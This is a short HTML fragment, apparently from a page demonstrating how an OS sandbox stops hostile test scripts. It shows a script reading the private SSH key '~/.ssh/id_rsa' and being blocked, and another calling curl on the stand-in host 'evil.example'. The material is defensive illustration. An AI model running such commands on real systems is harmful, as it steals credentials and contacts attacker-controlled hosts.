        <span style="margin-top: 10px; color: #6b6b6b">  test script → cat ~/.ssh/id_rsa</span>
        <span style="color: #ff8a7a">  ✗ stopped by the OS sandbox</span>
        <span style="margin-top: 10px; color: #6b6b6b">  test script → curl http://evil.example/</span>
